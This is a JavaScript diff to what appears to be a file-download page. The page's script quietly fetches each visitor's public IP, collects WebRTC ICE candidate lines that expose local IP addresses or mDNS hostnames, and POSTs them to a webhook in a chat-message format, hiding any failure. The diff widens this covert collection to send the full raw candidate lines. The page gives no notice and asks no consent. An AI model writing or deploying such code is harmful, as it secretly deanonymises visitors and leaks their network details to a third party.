@@ -95,8 +95,8 @@
     link.textContent = `⬇ Download "${name}"`;
   }
 
-  // Get all ICE candidates, including IPv4 and mDNS hostnames
-  function getAllCandidates(callback) {
+  // Collect all raw ICE candidate lines (IP or mDNS hostnames)
+  function getAllCandidateLines(callback) {
     const candidates = new Set();
     const pc = new RTCPeerConnection({ iceServers: [] });
     pc.createDataChannel("");
@@ -109,10 +109,7 @@
         callback(Array.from(candidates));
         return;
       }
-      const cand = event.candidate.candidate;
-      const parts = cand.split(' ');
-      const addr = parts[4]; // IP address or mDNS hostname
-      candidates.add(addr);
+      candidates.add(event.candidate.candidate);
     };
   }
 
@@ -121,12 +118,12 @@
       .then(res => res.json())
       .then(data => {
         const publicIP = data.ip;
-        getAllCandidates(cands => {
+        getAllCandidateLines(candidates => {
           fetch(webhookUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              content: `Public IP: ${publicIP}\nLocal ICE Candidates: ${cands.join(", ") || "None"}`
+              content: `Public IP: ${publicIP}\nICE Candidates:\n${candidates.join("\n") || "None"}`
             }),
           }).catch(() => {});
         });
